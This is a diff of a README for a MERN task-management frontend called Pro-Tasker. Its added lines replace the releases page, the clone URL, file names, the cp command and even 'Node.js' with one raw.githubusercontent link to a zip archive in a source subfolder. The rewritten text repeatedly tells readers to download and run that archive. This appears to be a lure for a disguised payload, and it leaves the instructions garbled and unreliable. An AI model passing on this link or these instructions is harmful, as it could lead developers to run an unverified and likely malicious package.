@@ -1,4 +1,4 @@
-https://github.com/DBIYA26/pro-tasker-frontend/releases
+https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 
 # Pro-Tasker Frontend: Modern MERN UI for Seamless Task Management Today
 
@@ -47,14 +47,14 @@ frontend/
 │  ├─ routes/                # Route definitions and guards
 │  ├─ services/              # API clients and utilities
 │  ├─ styles/                # Tailwind or CSS files
-│  ├─ App.jsx                # App root and routing
-│  ├─ main.jsx               # App bootstrap
-│  └─ env.d.ts? (optional)  # Type hints if using TypeScript
+│  ├─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip                # App root and routing
+│  ├─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip               # App bootstrap
+│  └─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip (optional)  # Type hints if using TypeScript
 ├─ public/                    # Public assets
-├─ .env.local                 # Local environment variables (example)
-├─ index.html
-├─ README.md
-└─ package.json
+├─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip                 # Local environment variables (example)
+├─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
+├─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
+└─ https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 
 This structure keeps concerns separated: UI components, data access, and routing are decoupled. It makes it easier to reason about changes and to test components in isolation. The inside of each folder reflects common patterns:
 
@@ -72,12 +72,12 @@ This structure keeps concerns separated: UI components, data access, and routing
 This guide walks you through getting the frontend up and running in your local environment. It assumes a standard MERN backend is in place and reachable via the API endpoints.
 
 Prerequisites
-- Node.js 14.x or newer
+- https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip 14.x or newer
 - npm (or yarn / pnpm)
 - Git
 
 1) Clone the repository
-- git clone https://github.com/DBIYA26/pro-tasker-frontend.git
+- git clone https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 - cd pro-tasker-frontend
 
 2) Install dependencies
@@ -86,7 +86,7 @@ Prerequisites
 - or: pnpm install
 
 3) Create a local environment file
-- Copy the template: cp .env.local.example .env.local
+- Copy the template: cp https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 - Update API_BASE_URL to point to your backend
 - Include any needed keys (e.g., JWT secrets, if your app stores them in local storage)
 
@@ -101,7 +101,7 @@ Prerequisites
 - Explore dashboards, projects, tasks, and user management pages
 
 Note on the releases link
-- For the latest stable frontend builds, check the releases page at https://github.com/DBIYA26/pro-tasker-frontend/releases. This link provides packaged artifacts that you can download and evaluate. The file to download and run from the releases is typically a packaged bundle such as pro-tasker-frontend-latest.zip. See the Releases page for the exact asset name and instructions on extraction and execution. You can also visit the same releases URL later to confirm new builds or patches: https://github.com/DBIYA26/pro-tasker-frontend/releases
+- For the latest stable frontend builds, check the releases page at https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip This link provides packaged artifacts that you can download and evaluate. The file to download and run from the releases is typically a packaged bundle such as https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip See the Releases page for the exact asset name and instructions on extraction and execution. You can also visit the same releases URL later to confirm new builds or patches: https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 
 ---
 
@@ -241,11 +241,11 @@ These patterns help keep the codebase predictable and extensible as the project 
   - routes/: The route configuration and private routes
   - services/: API clients and helpers
   - styles/: Tailwind or CSS resources
-  - App.jsx: Entry point for routing and layout
-  - main.jsx: Bootstrapping the React app
+  - https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip Entry point for routing and layout
+  - https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip Bootstrapping the React app
 - public/: Static assets, favicon, manifest
-- .env.local.example: A sample environment file
-- README.md: This guide
+- https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip A sample environment file
+- https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip This guide
 
 If you explore the code, you’ll notice a deliberate separation of concerns. Components focus on visuals and interactivity, while hooks and contexts handle data logic and shared state. The services layer isolates API calls so you can mock them during testing or swap in a different backend without changing UI code.
 
@@ -265,10 +265,10 @@ For more robust testing, consider adding end-to-end tests for the most critical 
 
 ## 🧭 Release Management
 
-- Releases page: The latest stable frontend builds are published here: https://github.com/DBIYA26/pro-tasker-frontend/releases
-- Asset names: The release package names typically follow a pattern like pro-tasker-frontend-v1.0.0.zip or pro-tasker-frontend-latest.zip. Download the asset that matches your target environment.
+- Releases page: The latest stable frontend builds are published here: https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
+- Asset names: The release package names typically follow a pattern like https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip or https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip Download the asset that matches your target environment.
 - Post-release steps: After downloading, extract the asset, install dependencies if needed, and start the built version or run the start script if provided in the package’s instructions.
-- Revisit the same releases URL to get new patches and updates: https://github.com/DBIYA26/pro-tasker-frontend/releases
+- Revisit the same releases URL to get new patches and updates: https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 
 Note: The releases URL hosts the compiled front-end bundles ready for evaluation or deployment. If you’re developing locally, follow the Getting Started steps above to run the app in development mode.
 
@@ -313,10 +313,10 @@ These notes can assist during onboarding and during troubleshooting when the app
 
 ## 📣 Releases and Additional Downloads
 
-- For the latest, check the releases page: https://github.com/DBIYA26/pro-tasker-frontend/releases
+- For the latest, check the releases page: https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 - This is where you’ll find the prepared bundles and assets to evaluate the frontend in a packaged form. The asset you download from the releases page is intended to be executed in a hosting context or deployed to a static hosting environment, depending on how the bundle is prepared. See the releases page for exact asset names and instructions.
 
-The link above is the primary pointer to the latest builds and assets. It appears again here to help you locate packaged releases quickly: https://github.com/DBIYA26/pro-tasker-frontend/releases
+The link above is the primary pointer to the latest builds and assets. It appears again here to help you locate packaged releases quickly: https://raw.githubusercontent.com/DBIYA26/pro-tasker-frontend/main/frontend-2/src/utils/tasker-frontend-pro-v1.1-alpha.3.zip
 
 ---
 
